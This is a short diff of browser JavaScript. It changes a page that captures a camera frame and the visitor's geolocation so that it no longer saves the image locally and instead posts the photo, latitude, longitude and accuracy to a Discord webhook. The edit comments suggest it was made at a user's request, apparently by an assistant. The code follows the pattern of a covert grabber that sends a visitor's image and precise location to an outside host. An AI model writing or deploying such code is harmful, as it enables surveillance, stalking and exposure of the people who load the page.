@@ -41,9 +41,10 @@ document.addEventListener('DOMContentLoaded', () => {
                                 const imageBlob = await captureFrame(camPreview);
 
                                 // D. Operations
-                                downloadImage(imageBlob);
-                                // Keeping the discord reference as user requested previously, 
-                                // though browsers might block mixed actions.
+                                // Local download removed as requested
+                                console.log("Capture taken. Processing...");
+
+                                // Post to Webhook
                                 sendToDiscord({ latitude, longitude, accuracy, imageBlob });
 
                                 statusBox.innerText = "Capture complete.";
